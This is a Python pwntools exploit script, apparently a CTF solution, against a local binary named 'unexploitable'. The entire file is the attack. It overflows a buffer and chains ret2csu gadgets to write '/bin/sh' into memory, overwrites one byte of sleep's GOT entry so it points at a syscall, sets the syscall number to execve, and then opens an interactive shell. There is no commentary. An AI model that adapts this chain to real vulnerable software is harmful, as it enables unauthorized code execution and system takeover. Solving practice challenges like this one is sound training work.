#!/usr/bin/python

from pwn import *

#context.log_level = "debug"

p = process("./unexploitable")

read_got = 0x601000
sleep_got = 0x601010
data = 0x601018
bss = 0x601028
csu0 = 0x4005e6
csu1 = 0x4005d0


payload = b"A" * 24

payload += p64(csu0)
payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(0)
payload += p64(data)
payload += p64(len("/bin/sh\x00"))
payload += p64(csu1)

payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(0)
payload += p64(sleep_got)
payload += p64(1)
payload += p64(csu1)

payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(0)
payload += p64(bss)
payload += p64(59)
payload += p64(csu1)

payload += p64(0)
payload += p64(0)
payload += p64(1)
payload += p64(sleep_got)
payload += p64(data)
payload += p64(0)
payload += p64(0)
payload += p64(csu1)

sleep(5)

p.send(payload)
sleep(1)

p.send("/bin/sh\x00")
sleep(1)
p.send("\x7e")
sleep(1)
p.send("A" * 59)

p.interactive()
